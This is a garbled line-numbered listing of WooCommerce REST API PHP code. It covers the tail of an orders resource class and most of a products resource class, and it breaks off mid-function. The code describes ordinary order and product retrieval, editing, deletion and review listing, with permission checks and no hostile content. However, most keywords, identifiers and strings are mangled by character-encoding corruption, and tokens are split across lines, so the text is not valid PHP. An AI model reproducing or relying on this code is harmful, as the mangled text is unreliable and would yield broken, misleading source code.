WC_API_S”v”
::
READABLE
 ),

55  
$rou‹s
;

68 
public
 
funùiÚ
 
	`g‘_Üd”s
Ğ
$f›lds
 = 
nuÎ
, 
$f‹r
 = 
	`¬¿y
(), 
$¡©us
 =‚uÎ, 
$·ge
 = 1 ) {

70 iàĞ! 
	`em±y
Ğ
$¡©us
 ) )

71 
$f‹r
['¡©us'] = 
$¡©us
;

73 
$f‹r
['·ge'] = 
$·ge
;

75 
$qu”y
 = 
$this
->
	`qu”y_Üd”s
Ğ
$f‹r
 );

77 
$Üd”s
 = 
	`¬¿y
();

79 
	`fÜ—ch
Ğ
$qu”y
->
po¡s
 
as
 
$Üd”_id
 ) {

81 iàĞ! 
$this
->
	`is_»adabË
Ğ
$Üd”_id
 ) )

84 
$Üd”s
[] = 
	`cu¼’t
Ğ
$this
->
	`g‘_Üd”
Ğ
$Üd”_id
, 
$f›lds
 ) );

87 
$this
->
£rv”
->
	`add_·gš©iÚ_h—d”s
Ğ
$qu”y
 );

89  
	`¬¿y
Ğ'Üd”s' => 
$Üd”s
 );

90 
	}
}

101 
public
 
funùiÚ
 
	$g‘_Üd”
Ğ
$id
, 
$f›lds
 = 
nuÎ
 ) {

104 
$id
 = 
$this
->
	`v®id©e_»que¡
( $id, 'shop_order', 'read' );

106 iàĞ
	`is_wp_”rÜ
Ğ
$id
 ) )

107  
$id
;

109 
$Üd”
 = 
Ãw
 
	`WC_Ord”
Ğ
$id
 );

111 
$Üd”_po¡
 = 
	`g‘_po¡
Ğ
$id
 );

113 
$Üd”_d©a
 = 
	`¬¿y
(

114 'id' => 
$Üd”
->
id
,

115 'Üd”_numb”' => 
$Üd”
->
	`g‘_Üd”_numb”
(),

116 'ü—‹d_©' => 
$this
->
£rv”
->
	`fÜm©_d©‘ime
Ğ
$Üd”_po¡
->
po¡_d©e_gmt
 ),

117 'upd©ed_©' => 
$this
->
£rv”
->
	`fÜm©_d©‘ime
Ğ
$Üd”_po¡
->
po¡_modif›d_gmt
 ),

118 'com¶‘ed_©' => 
$this
->
£rv”
->
	`fÜm©_d©‘ime
Ğ
$Üd”
->
com¶‘ed_d©e
, 
Œue
 ),

119 '¡©us' => 
$Üd”
->
¡©us
,

120 'cu¼’cy' => 
$Üd”
->
Üd”_cu¼’cy
,

121 'tÙ®' => 
	`wc_fÜm©_decim®
Ğ
$Üd”
->
	`g‘_tÙ®
(), 2 ),

122 'subtÙ®' => 
	`wc_fÜm©_decim®
Ğ
$this
->
	`g‘_Üd”_subtÙ®
Ğ
$Üd”
 ), 2 ),

123 'tÙ®_lše_™ems_quªt™y' => 
$Üd”
->
	`g‘_™em_couÁ
(),

124 'tÙ®_x' => 
	`wc_fÜm©_decim®
Ğ
$Üd”
->
	`g‘_tÙ®_x
(), 2 ),

125 'tÙ®_shpšg' => 
	`wc_fÜm©_decim®
Ğ
$Üd”
->
	`g‘_tÙ®_shpšg
(), 2 ),

126 'ÿ¹_x' => 
	`wc_fÜm©_decim®
Ğ
$Üd”
->
	`g‘_ÿ¹_x
(), 2 ),

127 'shpšg_x' => 
	`wc_fÜm©_decim®
Ğ
$Üd”
->
	`g‘_shpšg_x
(), 2 ),

128 'tÙ®_discouÁ' => 
	`wc_fÜm©_decim®
Ğ
$Üd”
->
	`g‘_tÙ®_discouÁ
(), 2 ),

129 'ÿ¹_discouÁ' => 
	`wc_fÜm©_decim®
Ğ
$Üd”
->
	`g‘_ÿ¹_discouÁ
(), 2 ),

130 'Üd”_discouÁ' => 
	`wc_fÜm©_decim®
Ğ
$Üd”
->
	`g‘_Üd”_discouÁ
(), 2 ),

131 'shpšg_m‘hods' => 
$Üd”
->
	`g‘_shpšg_m‘hod
(),

132 '·ym’t_d‘as' => 
	`¬¿y
(

133 'm‘hod_id' => 
$Üd”
->
·ym’t_m‘hod
,

134 'm‘hod_t™Ë' => 
$Üd”
->
·ym’t_m‘hod_t™Ë
,

135 '·id' => 
	`is£t
Ğ
$Üd”
->
·id_d©e
 ),

137 'blšg_add»ss' => 
	`¬¿y
(

138 'fœ¡_Çme' => 
$Üd”
->
blšg_fœ¡_Çme
,

139 'Ï¡_Çme' => 
$Üd”
->
blšg_Ï¡_Çme
,

140 'com·ny' => 
$Üd”
->
blšg_com·ny
,

141 'add»ss_1' => 
$Üd”
->
blšg_add»ss_1
,

142 'add»ss_2' => 
$Üd”
->
blšg_add»ss_2
,

143 'c™y' => 
$Üd”
->
blšg_c™y
,

144 '¡©e' => 
$Üd”
->
blšg_¡©e
,

145 'po¡code' => 
$Üd”
->
blšg_po¡code
,

146 'couÁry' => 
$Üd”
->
blšg_couÁry
,

147 'ema' => 
$Üd”
->
blšg_ema
,

148 'phÚe' => 
$Üd”
->
blšg_phÚe
,

150 'shpšg_add»ss' => 
	`¬¿y
(

151 'fœ¡_Çme' => 
$Üd”
->
shpšg_fœ¡_Çme
,

152 'Ï¡_Çme' => 
$Üd”
->
shpšg_Ï¡_Çme
,

153 'com·ny' => 
$Üd”
->
shpšg_com·ny
,

154 'add»ss_1' => 
$Üd”
->
shpšg_add»ss_1
,

155 'add»ss_2' => 
$Üd”
->
shpšg_add»ss_2
,

156 'c™y' => 
$Üd”
->
shpšg_c™y
,

157 '¡©e' => 
$Üd”
->
shpšg_¡©e
,

158 'po¡code' => 
$Üd”
->
shpšg_po¡code
,

159 'couÁry' => 
$Üd”
->
shpšg_couÁry
,

161 'nÙe' => 
$Üd”
->
cu¡om”_nÙe
,

162 'cu¡om”_' => 
$Üd”
->
cu¡om”__add»ss
,

163 'cu¡om”_u£r_ag’t' => 
$Üd”
->
cu¡om”_u£r_ag’t
,

164 'cu¡om”_id' => 
$Üd”
->
cu¡om”_u£r
,

165 'v›w_Üd”_u¾' => 
$Üd”
->
	`g‘_v›w_Üd”_u¾
(),

166 'lše_™ems' => 
	`¬¿y
(),

167 'shpšg_lšes' => 
	`¬¿y
(),

168 'x_lšes' => 
	`¬¿y
(),

169 'ãe_lšes' => 
	`¬¿y
(),

170 'coupÚ_lšes' => 
	`¬¿y
(),

174 
	`fÜ—ch
Ğ
$Üd”
->
	`g‘_™ems
(è
as
 
$™em_id
 => 
$™em
 ) {

176 
$´oduù
 = 
$Üd”
->
	`g‘_´oduù_äom_™em
Ğ
$™em
 );

178 
$Üd”_d©a
['lše_™ems'][] = 
	`¬¿y
(

179 'id' => 
$™em_id
,

180 'subtÙ®' => 
	`wc_fÜm©_decim®
Ğ
$Üd”
->
	`g‘_lše_subtÙ®
Ğ
$™em
 ), 2 ),

181 'tÙ®' => 
	`wc_fÜm©_decim®
Ğ
$Üd”
->
	`g‘_lše_tÙ®
Ğ
$™em
 ), 2 ),

182 'tÙ®_x' => 
	`wc_fÜm©_decim®
Ğ
$Üd”
->
	`g‘_lše_x
Ğ
$™em
 ), 2 ),

183 '´iû' => 
	`wc_fÜm©_decim®
Ğ
$Üd”
->
	`g‘_™em_tÙ®
Ğ
$™em
 ), 2 ),

184 'quªt™y' => (è
$™em
['qty'],

185 'x_şass' => ( ! 
	`em±y
Ğ
$™em
['x_şass'] ) ) ? $™em['x_şass'] : 
nuÎ
,

186 'Çme' => 
$™em
['name'],

187 '´oduù_id' => ( 
	`is£t
Ğ
$´oduù
->
v¬ŸtiÚ_id
 ) ) ? $´oduù->v¬ŸtiÚ_id : $´oduù->
id
,

188 'sku' => 
	`is_objeù
Ğ
$´oduù
 ) ? $´oduù->
	`g‘_sku
(è: 
nuÎ
,

193 
	`fÜ—ch
 ( 
$Üd”
->
	`g‘_shpšg_m‘hods
(è
as
 
$shpšg_™em_id
 => 
$shpšg_™em
 ) {

195 
$Üd”_d©a
['shpšg_lšes'][] = 
	`¬¿y
(

196 'id' => 
$shpšg_™em_id
,

197 'm‘hod_id' => 
$shpšg_™em
['method_id'],

198 'm‘hod_t™Ë' => 
$shpšg_™em
['name'],

199 'tÙ®' => 
	`wc_fÜm©_decim®
Ğ
$shpšg_™em
['cost'], 2 ),

204 
	`fÜ—ch
 ( 
$Üd”
->
	`g‘_x_tÙ®s
(è
as
 
$x_code
 => 
$x
 ) {

206 
$Üd”_d©a
['x_lšes'][] = 
	`¬¿y
(

207 'code' => 
$x_code
,

208 't™Ë' => 
$x
->
Ïb–
,

209 'tÙ®' => 
	`wc_fÜm©_decim®
Ğ
$x
->
amouÁ
, 2 ),

210 'compound' => (
boŞ
è
$x
->
is_compound
,

215 
	`fÜ—ch
 ( 
$Üd”
->
	`g‘_ães
(è
as
 
$ãe_™em_id
 => 
$ãe_™em
 ) {

217 
$Üd”_d©a
['ãe_lšes'] = 
	`¬¿y
(

218 'id' => 
$ãe_™em_id
,

219 't™Ë' => 
$ãe_™em
['name'],

220 'x_şass' => ( ! 
	`em±y
Ğ
$ãe_™em
['x_şass'] ) ) ? $ãe_™em['x_şass'] : 
nuÎ
,

221 'tÙ®' => 
	`wc_fÜm©_decim®
Ğ
$Üd”
->
	`g‘_lše_tÙ®
Ğ
$ãe_™em
 ), 2 ),

222 'tÙ®_x' => 
	`wc_fÜm©_decim®
Ğ
$Üd”
->
	`g‘_lše_x
Ğ
$ãe_™em
 ), 2 ),

227 
	`fÜ—ch
 ( 
$Üd”
->
	`g‘_™ems
Ğ'coupÚ' ) 
as
 
$coupÚ_™em_id
 => 
$coupÚ_™em
 ) {

229 
$Üd”_d©a
['coupÚ_lšes'] = 
	`¬¿y
(

230 'id' => 
$coupÚ_™em_id
,

231 'code' => 
$coupÚ_™em
['name'],

232 'amouÁ' => 
	`wc_fÜm©_decim®
Ğ
$coupÚ_™em
['discount_amount'], 2 ),

236  
	`¬¿y
Ğ'Üd”' => 
	`­¶y_f‹rs
Ğ'woocomm”û_­i_Üd”_»¥Ú£', 
$Üd”_d©a
, 
$Üd”
, 
$f›lds
, 
$this
->
£rv”
 ) );

237 
	}
}

247 
public
 
funùiÚ
 
g‘_Üd”s_couÁ
Ğ
$¡©us
 = 
nuÎ
, 
$f‹r
 = 
	$¬¿y
() ) {

249 iàĞ! 
	`em±y
Ğ
$¡©us
 ) )

250 
$f‹r
['¡©us'] = 
$¡©us
;

252 
$qu”y
 = 
$this
->
	`qu”y_Üd”s
Ğ
$f‹r
 );

254 iàĞ! 
	`cu¼’t_u£r_ÿn
( 'read_private_shop_orders' ) )

255  
Ãw
 
	`WP_E¼Ü
Ğ'woocomm”û_­i_u£r_ÿÂÙ_»ad_Üd”s_couÁ', 
	`__
Ğ'You dØnÙ hav³rmissiÚØ»adhÜd” couÁ', 'woocomm”û' ), 
	`¬¿y
( 'status' => 401 ) );

257  
	`¬¿y
Ğ'couÁ' => (è
$qu”y
->
found_po¡s
 );

258 
	}
}

270 
public
 
funùiÚ
 
	$ed™_Üd”
Ğ
$id
, 
$d©a
 ) {

272 
$id
 = 
$this
->
	`v®id©e_»que¡
( $id, 'shop_order', 'edit' );

274 iàĞ
	`is_wp_”rÜ
Ğ
$id
 ) )

275  
$id
;

277 
$Üd”
 = 
Ãw
 
	`WC_Ord”
Ğ
$id
 );

279 iàĞ! 
	`em±y
Ğ
$d©a
['status'] ) ) {

281 
$Üd”
->
	`upd©e_¡©us
Ğ
$d©a
['¡©us'], 
	`is£t
( $data['note'] ) ? $data['note'] : '' );

284  
$this
->
	`g‘_Üd”
Ğ
$id
 );

285 
	}
}

295 
public
 
funùiÚ
 
	$d–‘e_Üd”
Ğ
$id
, 
$fÜû
 = 
çl£
 ) {

297 
$id
 = 
$this
->
	`v®id©e_»que¡
( $id, 'shop_order', 'delete' );

299  
$this
->
	`d–‘e
Ğ
$id
, 'Üd”', ( 'Œue' ==ğ
$fÜû
 ) );

300 
	}
}

310 
public
 
funùiÚ
 
	$g‘_Üd”_nÙes
Ğ
$id
, 
$f›lds
 = 
nuÎ
 ) {

313 
$id
 = 
$this
->
	`v®id©e_»que¡
( $id, 'shop_order', 'read' );

315 iàĞ
	`is_wp_”rÜ
Ğ
$id
 ) )

316  
$id
;

318 
$¬gs
 = 
	`¬¿y
(

319 'po¡_id' => 
$id
,

324 
	`»move_f‹r
Ğ'comm’ts_şau£s', 
	`¬¿y
( 'WC_Comments', 'exclude_order_comments' ), 10, 1 );

326 
$nÙes
 = 
	`g‘_comm’ts
Ğ
$¬gs
 );

328 
	`add_f‹r
Ğ'comm’ts_şau£s', 
	`¬¿y
( 'WC_Comments', 'exclude_order_comments' ), 10, 1 );

330 
$Üd”_nÙes
 = 
	`¬¿y
();

332 
	`fÜ—ch
 ( 
$nÙes
 
as
 
$nÙe
 ) {

334 
$Üd”_nÙes
[] = 
	`¬¿y
(

335 'id' => 
$nÙe
->
comm’t_ID
,

336 'ü—‹d_©' => 
$this
->
£rv”
->
	`fÜm©_d©‘ime
Ğ
$nÙe
->
comm’t_d©e_gmt
 ),

337 'nÙe' => 
$nÙe
->
comm’t_cÚ‹Á
,

338 'cu¡om”_nÙe' => 
	`g‘_comm’t_m‘a
Ğ
$nÙe
->
comm’t_ID
, 'is_cu¡om”_nÙe', 
Œue
 ) ?ru: 
çl£
,

342  
	`¬¿y
Ğ'Üd”_nÙes' => 
	`­¶y_f‹rs
Ğ'woocomm”û_­i_Üd”_nÙes_»¥Ú£', 
$Üd”_nÙes
, 
$id
, 
$f›lds
, 
$nÙes
, 
$this
->
£rv”
 ) );

343 
	}
}

352 
´iv©e
 
funùiÚ
 
	$qu”y_Üd”s
Ğ
$¬gs
 ) {

355 
$qu”y_¬gs
 = 
	`¬¿y
(

362 iàĞ! 
	`em±y
Ğ
$¬gs
['status'] ) ) {

364 
$¡©u£s
 = 
	`ex¶ode
Ğ',', 
$¬gs
['status'] );

366 
$qu”y_¬gs
['x_qu”y'] = 
	`¬¿y
(

367 
	`¬¿y
(

370 '‹rms' => 
$¡©u£s
,

374 
	`un£t
Ğ
$¬gs
['status'] );

377 
$qu”y_¬gs
 = 
$this
->
	`m”ge_qu”y_¬gs
Ğ$qu”y_¬gs, 
$¬gs
 );

379  
Ãw
 
	`WP_Qu”y
Ğ
$qu”y_¬gs
 );

380 
	}
}

389 
´iv©e
 
funùiÚ
 
	$g‘_Üd”_subtÙ®
Ğ
$Üd”
 ) {

391 
$subtÙ®
 = 0;

394 
	`fÜ—ch
 ( 
$Üd”
->
	`g‘_™ems
(è
as
 
$™em
 ) {

396 
$subtÙ®
 +ğĞ
	`is£t
Ğ
$™em
['line_subtotal'] ) ) ? $item['line_subtotal'] : 0;

399  
$subtÙ®
;

400 
	}
}

	@includes/api/class-wc-api-products.php

1 <?
php


13 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

15 şas 
	cWC_API_Produùs
 
ex‹nds
 
	mWC_API_Resourû
 {

18 
´Ùeùed
 
	m$ba£
 = '/products';

32 
public
 
funùiÚ
 
	$»gi¡”_rou‹s
Ğ
$rou‹s
 ) {

34 #GET /
´oduùs


35 
$rou‹s
[ 
$this
->
ba£
 ] = 
	`¬¿y
(

36 
	`¬¿y
Ğ¬¿yĞ
$this
, 'g‘_´oduùs' ), 
WC_API_S”v”
::
READABLE
 ),

39 #GET /
´oduùs
/
couÁ


40 
$rou‹s
[ 
$this
->
ba£
 . '/couÁ'] = 
	`¬¿y
(

41 
	`¬¿y
Ğ¬¿yĞ
$this
, 'g‘_´oduùs_couÁ' ), 
WC_API_S”v”
::
READABLE
 ),

44 #GET /
´oduùs
/<
id
>

45 
$rou‹s
[ 
$this
->
ba£
 . '/(?P<id>\d+)' ] = 
	`¬¿y
(

46 
	`¬¿y
Ğ¬¿yĞ
$this
, 'g‘_´oduù' ), 
WC_API_S”v”
::
READABLE
 ),

49 #GET /
´oduùs
/<
id
>/
»v›ws


50 
$rou‹s
[ 
$this
->
ba£
 . '/(?P<id>\d+)/»v›ws' ] = 
	`¬¿y
(

51 
	`¬¿y
Ğ¬¿yĞ
$this
, 'g‘_´oduù_»v›ws' ), 
WC_API_S”v”
::
READABLE
 ),

54  
$rou‹s
;

67 
public
 
funùiÚ
 
	`g‘_´oduùs
Ğ
$f›lds
 = 
nuÎ
, 
$ty³
 =‚uÎ, 
$f‹r
 = 
	`¬¿y
(), 
$·ge
 = 1 ) {

69 iàĞ! 
	`em±y
Ğ
$ty³
 ) )

70 
$f‹r
['ty³'] = 
$ty³
;

72 
$f‹r
['·ge'] = 
$·ge
;

74 
$qu”y
 = 
$this
->
	`qu”y_´oduùs
Ğ
$f‹r
 );

76 
$´oduùs
 = 
	`¬¿y
();

78 
	`fÜ—ch
Ğ
$qu”y
->
po¡s
 
as
 
$´oduù_id
 ) {

80 iàĞ! 
$this
->
	`is_»adabË
Ğ
$´oduù_id
 ) )

83 
$´oduùs
[] = 
	`cu¼’t
Ğ
$this
->
	`g‘_´oduù
Ğ
$´oduù_id
, 
$f›lds
 ) );

86 
$this
->
£rv”
->
	`add_·gš©iÚ_h—d”s
Ğ
$qu”y
 );

88  
	`¬¿y
Ğ'´oduùs' => 
$´oduùs
 );

89 
	}
}

99 
public
 
funùiÚ
 
	$g‘_´oduù
Ğ
$id
, 
$f›lds
 = 
nuÎ
 ) {

101 
$id
 = 
$this
->
	`v®id©e_»que¡
( $id, 'product', 'read' );

103 iàĞ
	`is_wp_”rÜ
Ğ
$id
 ) )

104  
$id
;

106 
$´oduù
 = 
	`g‘_´oduù
Ğ
$id
 );

109 
$´oduù_d©a
 = 
$this
->
	`g‘_´oduù_d©a
Ğ
$´oduù
 );

112 iàĞ
$´oduù
->
	`is_ty³
Ğ'v¬ŸbË' ) && $´oduù->
	`has_chd
() ) {

114 
$´oduù_d©a
['v¬ŸtiÚs'] = 
$this
->
	`g‘_v¬ŸtiÚ_d©a
Ğ
$´oduù
 );

118 iàĞ
$´oduù
->
	`is_ty³
( 'variation' ) ) {

120 
$´oduù_d©a
['·»Á'] = 
$this
->
	`g‘_´oduù_d©a
Ğ
$´oduù
->
·»Á
 );

123  
	`¬¿y
Ğ'´oduù' => 
	`­¶y_f‹rs
Ğ'woocomm”û_­i_´oduù_»¥Ú£', 
$´oduù_d©a
, 
$´oduù
, 
$f›lds
, 
$this
->
£rv”
 ) );

124 
	}
}

134 
public
 
funùiÚ
 
g‘_´oduùs_couÁ
Ğ
$ty³
 = 
nuÎ
, 
$f‹r
 = 
	$¬¿y
() ) {

136 iàĞ! 
	`em±y
Ğ
$ty³
 ) )

137 
$f‹r
['ty³'] = 
$ty³
;

139 iàĞ! 
	`cu¼’t_u£r_ÿn
( 'read_private_products' ) )

140  
Ãw
 
	`WP_E¼Ü
Ğ'woocomm”û_­i_u£r_ÿÂÙ_»ad_´oduùs_couÁ', 
	`__
Ğ'You dØnÙ hav³rmissiÚØ»adh´oduù couÁ', 'woocomm”û' ), 
	`¬¿y
( 'status' => 401 ) );

142 
$qu”y
 = 
$this
->
	`qu”y_´oduùs
Ğ
$f‹r
 );

144  
	`¬¿y
Ğ'couÁ' => (è
$qu”y
->
found_po¡s
 );

145 
	}
}

155 
public
 
funùiÚ
 
	$ed™_´oduù
Ğ
$id
, 
$d©a
 ) {

157 
$id
 = 
$this
->
	`v®id©e_»que¡
( $id, 'product', 'edit' );

159 iàĞ
	`is_wp_”rÜ
Ğ
$id
 ) )

160  
$id
;

162  
$this
->
	`g‘_´oduù
Ğ
$id
 );

163 
	}
}

173 
public
 
funùiÚ
 
	$d–‘e_´oduù
Ğ
$id
, 
$fÜû
 = 
çl£
 ) {

175 
$id
 = 
$this
->
	`v®id©e_»que¡
( $id, 'product', 'delete' );

177 iàĞ
	`is_wp_”rÜ
Ğ
$id
 ) )

178  
$id
;

180  
$this
->
	`d–‘e
Ğ
$id
, '´oduù', ( 'Œue' ==ğ
$fÜû
 ) );

181 
	}
}

191 
public
 
funùiÚ
 
	$g‘_´oduù_»v›ws
Ğ
$id
, 
$f›lds
 = 
nuÎ
 ) {

193 
$id
 = 
$this
->
	`v®id©e_»que¡
( $id, 'product', 'read' );

195 iàĞ
	`is_wp_”rÜ
Ğ
$id
 ) )

196  
$id
;

198 
$¬gs
 = 
	`¬¿y
(

199 'po¡_id' => 
$id
,

203 
$comm’ts
 = 
	`g‘_comm’ts
Ğ
$¬gs
 );

205 
$»v›ws
 = 
	`¬¿y
();

207 
	`fÜ—ch
 ( 
$comm’ts
 
as
 
$comm’t
 ) {

209 
$»v›ws
[] = 
	`¬¿y
(

210 'id' => 
$comm’t
->
comm’t_ID
,

211 'ü—‹d_©' => 
$this
->
£rv”
->
	`fÜm©_d©‘ime
Ğ
$comm’t
->
comm’t_d©e_gmt
 ),

212 '»v›w' => 
$comm’t
->
comm’t_cÚ‹Á
,

213 '¿tšg' => 
	`g‘_comm’t_m‘a
Ğ
$comm’t
->
comm’t_ID
, '¿tšg', 
Œue
 ),

214 '»v›w”_Çme' => 
$comm’t
->
comm’t_authÜ
,

215 '»v›w”_ema' => 
$comm’t
->
comm’t_authÜ_ema
,

216 'v”if›d' => (
boŞ
è
	`wc_cu¡om”_bought_´oduù
Ğ
$comm’t
->
comm’t_authÜ_ema
, $comm’t->
u£r_id
, 
$id
 ),

220  
	`¬¿y
Ğ'´oduù_»v›ws' => 
	`­¶y_f‹rs
Ğ'woocomm”û_­i_´oduù_»v›ws_»¥Ú£', 
$»v›ws
, 
$id
, 
$f›lds
, 
$comm’ts
, 
$this
->
£rv”
 ) );

221 
	}
}

230 
´iv©e
 
funùiÚ
 
	$qu”y_´oduùs
Ğ
$¬gs
 ) {

233 
$qu”y_¬gs
 = 
	`¬¿y
(

237 'm‘a_qu”y' => 
	`¬¿y
(),

240 iàĞ! 
	`em±y
Ğ
$¬gs
['type'] ) ) {

242 
$ty³s
 = 
	`ex¶ode
Ğ',', 
$¬gs
['type'] );

244 
$qu”y_¬gs
['x_qu”y'] = 
	`¬¿y
(

245 
	`¬¿y
(

248 '‹rms' => 
$ty³s
,

252 
	`un£t
Ğ
$¬gs
['type'] );

255 
$qu”y_¬gs
 = 
$this
->
	`m”ge_qu”y_¬gs
Ğ$qu”y_¬gs, 
$¬gs
 );

257  
Ãw
 
	`WP_Qu”y
Ğ
$qu”y_¬gs
 );

258 
	}
}

267 
´iv©e
 
funùiÚ
 
	$g‘_´oduù_d©a
Ğ
$´oduù
 ) {

269  
	`¬¿y
(

270 't™Ë' => 
$´oduù
->
	`g‘_t™Ë
(),

271 'id' => (è
$´oduù
->
	`is_ty³
Ğ'v¬ŸtiÚ' ) ? $´oduù->
	`g‘_v¬ŸtiÚ_id
(è: $´oduù->
id
,

272 'ü—‹d_©' => 
$this
->
£rv”
->
	`fÜm©_d©‘ime
Ğ
$´oduù
->
	`g‘_po¡_d©a
()->
po¡_d©e_gmt
 ),

273 'upd©ed_©' => 
$this
->
£rv”
->
	`fÜm©_d©‘ime
Ğ
$´oduù
->
	`g‘_po¡_d©a
()->
po¡_modif›d_gmt
 ),

274 'ty³' => 
$´oduù
->
´oduù_ty³
,

275 '¡©us' => 
$´oduù
->
	`g‘_po¡_d©a
()->
po¡_¡©us
,

276 'dowÆßdabË' => 
$´oduù
->
	`is_dowÆßdabË
(),

277 'vœtu®' => 
$´oduù
->
	`is_vœtu®
(),

278 '³rm®šk' => 
$´oduù
->
	`g‘_³rm®šk
(),

279 'sku' => 
$´oduù
->
	`g‘_sku
(),

280 '´iû' => 
	`wc_fÜm©_decim®
Ğ
$´oduù
->
	`g‘_´iû
(), 2 ),

281 '»guÏr_´iû' => 
	`wc_fÜm©_decim®
Ğ
$´oduù
->
	`g‘_»guÏr_´iû
(), 2 ),

282 '§Ë_´iû' => 
$´oduù
->
	`g‘_§Ë_´iû
(è? 
	`wc_fÜm©_decim®
Ğ$´oduù->g‘_§Ë_´iû(), 2 ) : 
nuÎ
,

283 '´iû_html' => 
$´oduù
->
	`g‘_´iû_html
(),

284 'xabË' => 
$´oduù
->
	`is_xabË
(),

285 'x_¡©us' => 
$´oduù
->
	`g‘_x_¡©us
(),

286 'x_şass' => 
$´oduù
->
	`g‘_x_şass
(),

287 'mªagšg_¡ock' => 
$´oduù
->
	`mªagšg_¡ock
(),

288 '¡ock_quªt™y' => (è
$´oduù
->
	`g‘_¡ock_quªt™y
(),

289 'š_¡ock' => 
$´oduù
->
	`is_š_¡ock
(),

290 'backÜd”s_®lowed' => 
$´oduù
->
	`backÜd”s_®lowed
(),

291 'backÜd”ed' => 
$´oduù
->
	`is_Ú_backÜd”
(),

292 'sŞd_šdividu®ly' => 
$´oduù
->
	`is_sŞd_šdividu®ly
(),

293 'purcha£abË' => 
$´oduù
->
	`is_purcha§bË
(),

294 'ã©u»d' => 
$´oduù
->
	`is_ã©u»d
(),

295 'visibË' => 
$´oduù
->
	`is_visibË
(),

296 'ÿlog_visib™y' => 
$´oduù
->
visib™y
,

297 'Ú_§Ë' => 
$´oduù
->
	`is_Ú_§Ë
(),

298 'weight' => 
$´oduù
->
	`g‘_weight
(è? 
	`wc_fÜm©_decim®
Ğ$´oduù->g‘_weight(), 2 ) : 
nuÎ
,

299 'dim’siÚs' => 
	`¬¿y
(

300 'Ëngth' => 
$´oduù
->
Ëngth
,

301 'width' => 
$´oduù
->
width
,

302 'height' => 
$´oduù
->
height
,

303 'un™' => 
	`g‘_İtiÚ
( 'woocommerce_dimension_unit' ),

305 'shpšg_»quœed' => 
$´oduù
->
	`Ãeds_shpšg
(),

306 'shpšg_xabË' => 
$´oduù
->
	`is_shpšg_xabË
(),

307 'shpšg_şass' => 
$´oduù
->
	`g‘_shpšg_şass
(),

308 'shpšg_şass_id' => ( 0 !=ğ
$´oduù
->
	`g‘_shpšg_şass_id
(èè? $´oduù->g‘_shpšg_şass_id(è: 
nuÎ
,

309 'desütiÚ' => 
	`­¶y_f‹rs
Ğ'the_cÚ‹Á', 
$´oduù
->
	`g‘_po¡_d©a
()->
po¡_cÚ‹Á
 ),

310 'shÜt_desütiÚ' => 
	`­¶y_f‹rs
Ğ'woocomm”û_shÜt_desütiÚ', 
$´oduù
->
	`g‘_po¡_d©a
()->
po¡_exû½t
 ),

311 '»v›ws_®lowed' => ( 'İ’' ==ğ
$´oduù
->
	`g‘_po¡_d©a
()->
comm’t_¡©us
 ),

312 'av”age_¿tšg' => 
	`wc_fÜm©_decim®
Ğ
$´oduù
->
	`g‘_av”age_¿tšg
(), 2 ),

313 '¿tšg_couÁ' => (è
$´oduù
->
	`g‘_¿tšg_couÁ
(),

314 '»Ï‹d_ids' => 
	`¬¿y_m­
Ğ'absšt', 
	`¬¿y_v®ues
Ğ
$´oduù
->
	`g‘_»Ï‹d
() ) ),

315 'up£Î_ids' => 
	`¬¿y_m­
Ğ'absšt', 
$´oduù
->
	`g‘_up£Îs
() ),

316 'üoss_£Î_ids' => 
	`¬¿y_m­
Ğ'absšt', 
$´oduù
->
	`g‘_üoss_£Îs
() ),

317 'ÿ‹gÜ›s' => 
	`wp_g‘_po¡_‹rms
Ğ
$´oduù
->
id
, '´oduù_ÿt', 
	`¬¿y
( 'fields' => 'names' ) ),

318 'gs' => 
	`wp_g‘_po¡_‹rms
Ğ
$´oduù
->
id
, '´oduù_g', 
	`¬¿y
( 'fields' => 'names' ) ),

319 'images' => 
$this
->
	`g‘_images
Ğ
$´oduù
 ),

320 'ã©u»d_¤c' => 
	`wp_g‘_©chm’t_u¾
Ğ
	`g‘_po¡_thumbÇ_id
Ğ
$´oduù
->
	`is_ty³
Ğ'v¬ŸtiÚ' ) ? $´oduù->
v¬ŸtiÚ_id
 : $´oduù->
id
 ) ),

321 '©Œibu‹s' => 
$this
->
	`g‘_©Œibu‹s
Ğ
$´oduù
 ),

322 'dowÆßds' => 
$this
->
	`g‘_dowÆßds
Ğ
$´oduù
 ),

323 'dowÆßd_lim™' => (è
$´oduù
->
dowÆßd_lim™
,

324 'dowÆßd_expœy' => (è
$´oduù
->
dowÆßd_expœy
,

325 'dowÆßd_ty³' => 
$´oduù
->
dowÆßd_ty³
,

326 'purcha£_nÙe' => 
	`­¶y_f‹rs
Ğ'the_cÚ‹Á', 
$´oduù
->
purcha£_nÙe
 ),

327 'tÙ®_§Ës' => 
	`m‘ad©a_exi¡s
Ğ'po¡', 
$´oduù
->
id
, 'tÙ®_§Ës' ) ? (è
	`g‘_po¡_m‘a
Ğ$´oduù->id, 'tÙ®_§Ës', 
Œue
 ) : 0,

328 'v¬ŸtiÚs' => 
	`¬¿y
(),

329 '·»Á' => 
	`¬¿y
(),

331 
	}
}

340 
´iv©e
 
funùiÚ
 
	$g‘_v¬ŸtiÚ_d©a
Ğ
$´oduù
 ) {

342 
$v¬ŸtiÚs
 = 
	`¬¿y
();

344 
	`fÜ—ch
 ( 
$´oduù
->
	`g‘_chd»n
(è
as
 
$chd_id
 ) {

346 
$v¬ŸtiÚ
 = 
$´oduù
->
	`g‘_chd
Ğ
$chd_id
 );

348 iàĞ! 
$v¬ŸtiÚ
->
	`exi¡s
() )

351 
$v¬ŸtiÚs
[] = 
	`¬¿y
(

352 'id' => 
$v¬ŸtiÚ
->
	`g‘_v¬ŸtiÚ_id
(),

353 'ü—‹d_©' => 
$this
->
£rv”
->
	`fÜm©_d©‘ime
Ğ
$v¬ŸtiÚ
->
	`g‘_po¡_d©a
()->
po¡_d©e_gmt
 ),

354 'upd©ed_©' => 
$this
->
£rv”
->
	`fÜm©_d©‘ime
Ğ
$v¬ŸtiÚ
->
	`g‘_po¡_d©a
()->
po¡_modif›d_gmt
 ),

355 'dowÆßdabË' => 
$v¬ŸtiÚ
->
	`is_dowÆßdabË
(),

356 'vœtu®' => 
$v¬ŸtiÚ
->
	`is_vœtu®
(),

357 '³rm®šk' => 
$v¬ŸtiÚ
->
	`g‘_³rm®šk
(),

358 'sku' => 
$v¬ŸtiÚ
->
	`g‘_sku
(),

359 '´iû' => 
	`wc_fÜm©_decim®
Ğ
$v¬ŸtiÚ
->
	`g‘_´iû
(), 2 ),

360 '»guÏr_´iû' => 
	`wc_fÜm©_decim®
